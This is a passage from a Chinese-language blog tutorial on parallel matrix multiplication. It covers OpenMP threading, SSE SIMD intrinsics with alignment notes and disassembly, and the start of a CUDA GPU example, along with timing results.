    <span class="k">return</span> <span class="n">Matrix</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

    <span class="kt">float</span> <span class="o">**</span><span class="n">A</span> <span class="o">=</span> <span class="n">randMatrix</span><span class="p">();</span>
    <span class="kt">float</span> <span class="o">**</span><span class="n">B</span> <span class="o">=</span> <span class="n">randMatrix</span><span class="p">();</span>
    <span class="c1">// 分别计算并计时</span>
    <span class="kt">clock_t</span> <span class="n">normal_beg</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">MulNormal</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">);</span>
    <span class="kt">clock_t</span> <span class="n">normal_end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>

    <span class="kt">clock_t</span> <span class="n">MP_beg</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">MulMP</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">);</span>
    <span class="kt">clock_t</span> <span class="n">MP_end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="c1">// 输出</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"normal: "</span><span class="o">&lt;&lt;</span><span class="n">normal_end</span> <span class="o">-</span> <span class="n">normal_beg</span><span class="o">&lt;&lt;</span><span class="s">" ms"</span><span class="o">&lt;&lt;</span><span class="sc">'\n'</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"MP:     "</span><span class="o">&lt;&lt;</span><span class="n">MP_end</span> <span class="o">-</span> <span class="n">MP_beg</span><span class="o">&lt;&lt;</span><span class="s">" ms"</span><span class="o">&lt;&lt;</span><span class="sc">'\n'</span><span class="p">;</span>
    <span class="n">check</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="输出结果以及对比">   输出结果以及对比</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>normal: 1097 ms
MP:     454 ms
13.9073 16.8046 14.3195 17.28 13.1921 15.0843 15.269 16.6484 15.771 15.2247 14.5149 13.783 12.2384 14.3623 15.2282 15.4888 
13.9073 16.8046 14.3195 17.28 13.1921 15.0843 15.269 16.6484 15.771 15.2247 14.5149 13.783 12.2384 14.3623 15.2282 15.4888
</code></pre></div></div> <h5 id="示例中使用了简单的pragma预处理指令并行最外层的循环设置线程为4在矩阵大小为6464是取得了较好的效果然而如果进一步增大矩阵大小可能出现cache命中率下降线程之间错误共享综合时间反而不如串行的现象此时需要手动对线程进一步细化管理例如schedulemode-size-critical等预处理指令其次如果增加线程数量num_threads会导致维护线程的开支增大以及线程之间的资源竞争所以需要对线程数量进行权衡">   示例中使用了简单的<code class="language-plaintext highlighter-rouge">#pragma</code>预处理指令并行最外层的循环，设置线程为4，在矩阵大小为64*64是取得了较好的效果<br/>   然而，如果进一步增大矩阵大小，可能出现cache命中率下降，线程之间’错误共享’，综合时间反而不如串行的现象。此时，需要手动对线程进一步细化管理，例如<code class="language-plaintext highlighter-rouge">schedule(mode, size), critical</code>等预处理指令<br/>   其次，如果增加线程数量(num_threads)，会导致维护线程的开支增大，以及线程之间的资源竞争，所以需要对线程数量进行权衡.</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># thread_num = 16;</span>
normal: 805 ms
MP:     194067 ms
17.8174 17.7196 16.8649 16.4366 19.456 16.0795 17.8538 17.5493 17.6787 16.7344 15.528 15.5007 12.8625 17.4086 17.7185 16.5289 
17.8174 17.7196 16.8649 16.4366 19.456 16.0795 17.8538 17.5493 17.6787 16.7344 15.528 15.5007 12.8625 17.4086 17.7185 16.5289
</code></pre></div></div> <h3 id="数据级别并行">数据级别并行</h3> <h5 id="数据级并行是一种显式并行技术主要通过单指令多数据single-instruction-multiple-data-simd的方式实现在simd模型中一条指令可以同时对多个数据进行相同的操作这种并行性特别适用于处理大量相同类型的数据集如图像处理音频处理科学计算中的向量和矩阵运算等在x86汇编中有很多的拓展指令集能够实现simd-例如mmxsseavx-这些指令集通过将单一数据组合并放入拓展的寄存器中如xmm系列寄存器配合专用的拓展指令完成数据级别的并行和快速计算以浮点数的加法为例使用sse拓展指令拓展指令可以使用gccg自带的库进行连接也可以在代码中直接插入内联汇编指令下面的示例代码采用前者的方法">   数据级并行是一种显式并行技术，主要通过单指令多数据（Single Instruction, Multiple Data, SIMD）的方式实现。在SIMD模型中，一条指令可以同时对多个数据进行相同的操作。这种并行性特别适用于处理大量相同类型的数据集，如图像处理、音频处理、科学计算中的向量和矩阵运算等<br/>   在X86汇编中，有很多的拓展指令集能够实现SIMD, 例如MMX、SSE、AVX, 这些指令集通过将单一数据组合并放入拓展的寄存器中(如xmm系列寄存器)，配合专用的拓展指令，完成数据级别的并行和快速计算。<br/>   以浮点数的加法为例，使用SSE拓展指令。拓展指令可以使用gcc/g++自带的库进行连接，也可以在代码中直接插入内联汇编指令，下面的示例代码采用前者的方法.</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;pmmintrin.h&gt;</span><span class="c1"> </span><span class="cp">
#include</span> <span class="cpf">&lt;ctime&gt;</span><span class="cp">
</span>
<span class="k">const</span> <span class="kt">int</span> <span class="n">N</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>

<span class="kt">float</span> <span class="n">NormalMul</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">];</span>
<span class="kt">float</span> <span class="n">SSEMul</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">check</span><span class="p">(){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">NormalMul</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="sc">' '</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">SSEMul</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="sc">' '</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>

<span class="p">}</span>
<span class="c1">// 矩阵数据随即处理</span>
<span class="kt">float</span><span class="o">**</span> <span class="nf">randMatrix</span><span class="p">(){</span>
    <span class="n">srand</span><span class="p">(</span><span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="n">nullptr</span><span class="p">)));</span>
    <span class="kt">float</span> <span class="o">**</span><span class="n">Matrix</span> <span class="o">=</span> <span class="p">(</span><span class="kt">float</span><span class="o">**</span><span class="p">)</span><span class="n">_mm_malloc</span><span class="p">(</span><span class="n">N</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="o">*</span><span class="p">),</span> <span class="mi">16</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="n">Matrix</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">float</span><span class="o">*</span><span class="p">)</span><span class="n">_mm_malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span> <span class="o">*</span> <span class="n">N</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="n">Matrix</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">float</span><span class="o">&gt;</span><span class="p">(</span><span class="n">rand</span><span class="p">())</span> <span class="o">/</span> <span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">float</span><span class="o">&gt;</span><span class="p">(</span><span class="n">RAND_MAX</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">Matrix</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">MulNormal</span><span class="p">(</span><span class="kt">float</span> <span class="o">**</span><span class="n">A</span><span class="p">,</span> <span class="kt">float</span> <span class="o">**</span><span class="n">B</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">){</span>
                <span class="n">NormalMul</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">+=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">*</span> <span class="n">B</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">k</span><span class="p">];</span> <span class="c1">// &lt;---- 计算方式与SSE方法保持一致</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">MulSSE</span><span class="p">(</span><span class="kt">float</span> <span class="o">**</span><span class="n">A</span><span class="p">,</span> <span class="kt">float</span> <span class="o">**</span><span class="n">B</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="n">__m128</span> <span class="n">temp</span> <span class="o">=</span> <span class="n">_mm_setzero_ps</span><span class="p">();</span> <span class="c1">// 初始化一个空的xmm寄存器</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="n">k</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">){</span>
                <span class="n">temp</span> <span class="o">=</span> <span class="n">_mm_add_ps</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> 
                <span class="n">_mm_mul_ps</span><span class="p">(</span><span class="n">_mm_load_ps</span><span class="p">(</span><span class="o">&amp;</span><span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]),</span> 
                <span class="n">_mm_load_ps</span><span class="p">(</span><span class="o">&amp;</span><span class="n">B</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">k</span><span class="p">])));</span>
            <span class="p">}</span>
            <span class="n">temp</span> <span class="o">=</span> <span class="n">_mm_hadd_ps</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">temp</span><span class="p">);</span>
            <span class="n">temp</span> <span class="o">=</span> <span class="n">_mm_hadd_ps</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">temp</span><span class="p">);</span>
            <span class="n">_mm_store_ss</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SSEMul</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">],</span> <span class="n">temp</span><span class="p">);</span> <span class="c1">// 两次水平加法，获取一个xmm寄存器中的4个float数据的加和</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">float</span> <span class="o">**</span><span class="n">A</span> <span class="o">=</span> <span class="n">randMatrix</span><span class="p">();</span>
    <span class="kt">float</span> <span class="o">**</span><span class="n">B</span> <span class="o">=</span> <span class="n">randMatrix</span><span class="p">();</span>
    
    <span class="kt">clock_t</span> <span class="n">normal_beg</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">MulNormal</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">);</span>
    <span class="kt">clock_t</span> <span class="n">normal_end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>

    <span class="kt">clock_t</span> <span class="n">SSE_beg</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">MulSSE</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">);</span>
    <span class="kt">clock_t</span> <span class="n">SSE_end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>

    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"normal: "</span><span class="o">&lt;&lt;</span><span class="n">normal_end</span> <span class="o">-</span> <span class="n">normal_beg</span><span class="o">&lt;&lt;</span><span class="s">" ms"</span><span class="o">&lt;&lt;</span><span class="sc">'\n'</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"SSE:    "</span><span class="o">&lt;&lt;</span><span class="n">SSE_end</span> <span class="o">-</span> <span class="n">SSE_beg</span><span class="o">&lt;&lt;</span><span class="s">" ms"</span><span class="o">&lt;&lt;</span><span class="sc">'\n'</span><span class="p">;</span>
    <span class="n">check</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// g++ -msse3 SSE.cpp -o SSE</span>
</code></pre></div></div> <h5 id="结果输出">   结果输出</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># const int N = 64;</span>
normal: 1113 ms
SSE:    373 ms
22.9132 14.8315 16.3082 15.3699 18.9539 17.6561 20.4305 17.9889 15.3361 15.531 15.0805 18.0234 16.0815 15.5114 15.6305 18.4012 
22.9132 14.8315 16.3082 15.3699 18.9539 17.6561 20.4305 17.9889 15.3361 15.531 15.0805 18.0234 16.0815 15.5114 15.6305 18.4012 
</code></pre></div></div> <h5 id="使用sse指令有许多细节需要考虑这是由于_mm_add_ps等接口并非函数而是打包的汇编指令使用时有诸多限制">   使用SSE指令有许多细节需要考虑，这是由于<code class="language-plaintext highlighter-rouge">_mm_add_ps</code>等接口，并非函数而是打包的汇编指令，使用时有诸多限制<br/></h5> <h5 id="编译过程中不存在类型检查和对齐检查所以在编写中需要手动确认变量内存的大小和对齐以避免出现由于不当地使用汇编指令造成的内存溢出甚至是段错误下面是源代码的二进制文件中的一段截取对应的是_mm_setzero_ps的工作">   编译过程中不存在类型检查和对齐检查，所以在编写中需要手动确认变量内存的大小和对齐，以避免出现由于不当地使用汇编指令造成的内存溢出甚至是段错误。<br/>   下面是源代码的二进制文件中的一段截取，对应的是<code class="language-plaintext highlighter-rouge">_mm_setzero_ps</code>的工作。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:0000000000001231                 mov     rax, <span class="o">[</span>rbp+var_68]
.text:0000000000001235                 movups  xmm0, xmmword ptr <span class="o">[</span>rax]
.text:0000000000001238                 movaps  <span class="o">[</span>rbp+var_60], xmm0
.text:000000000000123C                 mov     eax, <span class="o">[</span>rbp+var_7C]
</code></pre></div></div> <h5 id="其次sse指令中的movups和movaps要求的是连续的一块16bit内存所以需要对矩阵运算做一些改造考虑如下代码是cpu串行计算时最内层的计算方式注意其中的bkj在依次遍历k的过程中bkjbk1jbk2j的内存不连续-无法通过指令直接加载进入xmm寄存器">   其次，SSE指令中的<code class="language-plaintext highlighter-rouge">movups和movaps</code>要求的是连续的一块16bit内存，所以，需要对矩阵运算做一些改造<br/>   考虑如下代码，是cpu串行计算时，最内层的计算方式。注意其中的<code class="language-plaintext highlighter-rouge">B[k][j]</code>，在依次遍历<code class="language-plaintext highlighter-rouge">k</code>的过程中，<code class="language-plaintext highlighter-rouge">B[k][j]、B[k+1][j]、B[k+2][j]</code>的内存不连续, 无法通过指令直接加载进入xmm寄存器</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">){</span>
    <span class="n">NormalMul</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">+=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">*</span> <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="将矩阵b从-行x列-的格式转化为-列x行-的格式如下">   将矩阵B从 行x列 的格式，转化为 列x行 的格式，如下</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">){</span>
    <span class="n">NormalMul</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">+=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">*</span> <span class="n">B</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">k</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="此时遍历过程中两个操作数就都是连续的内存">   此时，遍历过程中两个操作数就都是连续的内存</h5> <h3 id="gpu并行计算">GPU并行计算</h3> <h5 id="gpu拥有大量的计算核心擅长于计算与图形相关的各种矩阵运算大规模数据的简单处理当单机的运算资源不足是可以将部分运算分配给gpu-利用gpu进行并行运算以nvidia的独显为例使用配套的cuda工具链中的nvcc编译器编写一个2维矩阵的乘法运算源代码中使用__host__和__device__关键字来区分分配给cpu或者是gpu的工作对于gpu的函数还需提前设置网格grid和线程块block">   GPU拥有大量的计算核心，擅长于计算与图形相关的各种矩阵运算(大规模数据的简单处理)。当单机的运算资源不足是，可以将部分运算分配给GPU, 利用GPU进行并行运算.<br/>   以Nvidia的独显为例，使用配套的CUDA工具链中的nvcc编译器，编写一个2维矩阵的乘法运算<br/>   源代码中，使用<code class="language-plaintext highlighter-rouge">__host__</code>和<code class="language-plaintext highlighter-rouge">__device__</code>关键字来区分分配给CPU或者是GPU的工作，对于GPU的函数，还需提前设置网格(grid)和线程块(block)<br/></h5> <h5 id="很久之前的写的代码拿出来水一下">   很久之前的写的代码拿出来水一下</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"utils.cuh"</span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;ctime&gt;</span><span class="cp">
</span><span class="n">using</span> <span class="n">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="k">const</span> <span class="kt">int</span> <span class="n">N</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>
<span class="kt">float</span> <span class="n">Matrix_CPU_A</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">],</span> <span class="n">Matrix_CPU_B</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">],</span> <span class="n">Matrix_CPU_C</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">];</span>
<span class="kt">float</span> <span class="o">**</span><span class="n">Matrix_GPU_A</span><span class="p">,</span><span class="o">**</span><span class="n">Matrix_GPU_B</span><span class="p">,</span><span class="o">**</span><span class="n">Matrix_GPU_C</span><span class="p">;</span>

<span class="n">__host__</span> <span class="kt">void</span> <span class="nf">randomMatrix</span><span class="p">(</span><span class="kt">float</span> <span class="n">matrix</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">]){</span>
    <span class="n">srand</span><span class="p">(</span><span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="n">nullptr</span><span class="p">)));</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="n">matrix</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">float</span><span class="o">&gt;</span><span class="p">(</span><span class="n">rand</span><span class="p">())</span> <span class="o">/</span> <span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">float</span><span class="o">&gt;</span><span class="p">(</span><span class="n">RAND_MAX</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">__host__</span> <span class="kt">void</span> <span class="nf">CPUMul</span><span class="p">(){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">){</span>
                <span class="n">Matrix_CPU_C</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">+=</span> <span class="n">Matrix_CPU_A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">*</span> <span class="n">Matrix_CPU_B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="n">__host__</span> <span class="kt">void</span> <span class="nf">check</span><span class="p">(</span><span class="kt">float</span> <span class="n">matrix</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">]){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="sc">' '</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">endl</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">__device__</span> <span class="kt">float</span> <span class="nf">GPUMulAtom</span><span class="p">(</span><span class="kt">float</span> <span class="n">a</span><span class="p">,</span> <span class="kt">float</span> <span class="n">b</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">__global__</span> <span class="kt">void</span> <span class="nf">GPUMul</span><span class="p">(</span><span class="kt">float</span> <span class="o">**</span><span class="n">A</span><span class="p">,</span> <span class="kt">float</span> <span class="o">**</span><span class="n">B</span><span class="p">,</span> <span class="kt">float</span> <span class="o">**</span><span class="n">C</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">row</span> <span class="o">=</span> <span class="n">blockIdx</span><span class="p">.</span><span class="n">x</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">col</span> <span class="o">=</span> <span class="n">threadIdx</span><span class="p">.</span><span class="n">x</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">range</span> <span class="o">=</span> <span class="n">threadIdx</span><span class="p">.</span><span class="n">y</span><span class="p">;</span>
    <span class="n">C</span><span class="p">[</span><span class="n">row</span><span class="p">][</span><span class="n">col</span><span class="p">]</span> <span class="o">=</span> <span class="n">GPUMulAtom</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="n">row</span><span class="p">][</span><span class="n">range</span><span class="p">],</span> <span class="n">B</span><span class="p">[</span><span class="n">range</span><span class="p">][</span><span class="n">col</span><span class="p">]);</span>
<span class="p">}</span>
<span class="n">__global__</span> <span class="kt">void</span> <span class="nf">GPUCheck</span><span class="p">(</span><span class="kt">float</span> <span class="o">**</span><span class="n">matrix</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%f "</span><span class="p">,</span> <span class="n">matrix</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">randomMatrix</span><span class="p">(</span><span class="n">Matrix_CPU_A</span><span class="p">);</span>
    <span class="n">randomMatrix</span><span class="p">(</span><span class="n">Matrix_CPU_B</span><span class="p">);</span>
    <span class="kt">float</span> <span class="o">**</span><span class="n">Matrix_GPU_A</span><span class="p">,</span><span class="o">**</span><span class="n">Matrix_GPU_B</span><span class="p">,</span><span class="o">**</span><span class="n">Matrix_GPU_C</span><span class="p">;</span>

